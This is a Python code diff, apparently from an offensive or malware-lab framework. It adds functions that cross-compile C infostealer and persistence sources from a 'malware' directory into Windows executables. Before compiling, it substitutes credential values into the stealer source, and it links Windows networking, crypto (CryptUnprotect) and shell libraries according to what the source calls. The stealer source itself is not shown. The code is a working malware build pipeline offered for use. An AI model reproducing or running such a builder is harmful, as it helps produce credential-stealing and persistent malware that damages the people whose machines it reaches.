@@ -87,6 +87,24 @@ def _apply_credential_subs(src: str) -> str:
     return src
 
 
+_MALWARE_DIR = _BASE / "malware"
+
+
+def _extra_libs(src: str) -> list[str]:
+    libs: list[str] = []
+    if re.search(r'WinHttp|winhttp', src):
+        libs.append("-lwinhttp")
+    if re.search(r'GetAdaptersInfo|GetIpAddrTable|iphlpapi', src, re.I):
+        libs.append("-liphlpapi")
+    if re.search(r'CryptProtect|CryptUnprotect|crypt32', src, re.I):
+        libs.append("-lcrypt32")
+    if re.search(r'WSAStartup|WSACleanup|ws2_32', src, re.I):
+        libs.append("-lws2_32")
+    if re.search(r'SHGetFolderPath|SHGetSpecialFolder|shlobj', src, re.I):
+        libs.append("-lshell32")
+    return libs
+
+
 def _find_compiler(compiler_type: str) -> Optional[str]:
     candidates: dict[str, list[str]] = {
         "mingw-gcc": ["x86_64-w64-mingw32-gcc", "/usr/bin/x86_64-w64-mingw32-gcc"],
@@ -172,6 +190,100 @@ def compile_module(
             if result.returncode == 0 and out_file.exists():
                 size = out_file.stat().st_size
                 log.append(f"[ok] {out_file.name} ({size:,} bytes)")
+                return True, "\n".join(log), out_file
+            log.append(f"[fail] rc={result.returncode}")
+            return False, "\n".join(log), None
+        except subprocess.TimeoutExpired:
+            return False, "compilation timed out (60s)", None
+        except Exception as e:
+            return False, str(e), None
+
+
+def compile_stealer(
+    stealer_name: str,
+    session_id: str,
+) -> tuple[bool, str, Optional[Path]]:
+    """Compile a stealer from malware/stealer/.  Returns (ok, log, out_path)."""
+    src_path = _MALWARE_DIR / "stealer" / f"{stealer_name}.c"
+    if not src_path.exists():
+        return False, f"stealer source not found: {src_path.name}", None
+
+    compiler = _find_compiler("mingw-gcc")
+    if not compiler:
+        return False, "mingw-gcc not installed", None
+
+    out_dir = _SAMPLES / session_id
+    out_dir.mkdir(parents=True, exist_ok=True)
+    out_file = out_dir / "peekaboo.exe"
+
+    log: list[str] = []
+    with tempfile.TemporaryDirectory() as tmpdir:
+        tmp     = Path(tmpdir)
+        tmp_src = tmp / src_path.name
+        shutil.copy2(src_path, tmp_src)
+
+        try:
+            text = tmp_src.read_text(encoding="utf-8", errors="replace")
+            tmp_src.write_text(_apply_credential_subs(text), encoding="utf-8")
+        except Exception as e:
+            log.append(f"[warn] cred sub: {e}")
+            text = tmp_src.read_text(encoding="utf-8", errors="replace")
+
+        extra_libs = _extra_libs(text)
+        cmd = [compiler, *MINGW_FLAGS, str(tmp_src), "-o", str(out_file)] + extra_libs
+        log.append(f"[compile] {' '.join(cmd)}")
+
+        try:
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+            if result.stdout:
+                log.append(result.stdout)
+            if result.stderr:
+                log.append(result.stderr)
+            if result.returncode == 0 and out_file.exists():
+                log.append(f"[ok] {out_file.name} ({out_file.stat().st_size:,} bytes)")
+                return True, "\n".join(log), out_file
+            log.append(f"[fail] rc={result.returncode}")
+            return False, "\n".join(log), None
+        except subprocess.TimeoutExpired:
+            return False, "compilation timed out (60s)", None
+        except Exception as e:
+            return False, str(e), None
+
+
+def compile_persistence(
+    persistence_name: str,
+    out_dir: Path,
+) -> tuple[bool, str, Optional[Path]]:
+    """Compile a persistence mechanism from malware/persistence/.  Returns (ok, log, out_path)."""
+    src_path = _MALWARE_DIR / "persistence" / f"{persistence_name}.c"
+    if not src_path.exists():
+        return False, f"persistence source not found: {src_path.name}", None
+
+    compiler = _find_compiler("mingw-gcc")
+    if not compiler:
+        return False, "mingw-gcc not installed", None
+
+    out_file = out_dir / "persistence.exe"
+    log: list[str] = []
+
+    with tempfile.TemporaryDirectory() as tmpdir:
+        tmp     = Path(tmpdir)
+        tmp_src = tmp / src_path.name
+        shutil.copy2(src_path, tmp_src)
+
+        text       = src_path.read_text(encoding="utf-8", errors="replace")
+        extra_libs = _extra_libs(text)
+        cmd = [compiler, *MINGW_FLAGS, str(tmp_src), "-o", str(out_file)] + extra_libs
+        log.append(f"[compile] {' '.join(cmd)}")
+
+        try:
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+            if result.stdout:
+                log.append(result.stdout)
+            if result.stderr:
+                log.append(result.stderr)
+            if result.returncode == 0 and out_file.exists():
+                log.append(f"[ok] {out_file.name} ({out_file.stat().st_size:,} bytes)")
                 return True, "\n".join(log), out_file
             log.append(f"[fail] rc={result.returncode}")
             return False, "\n".join(log), None
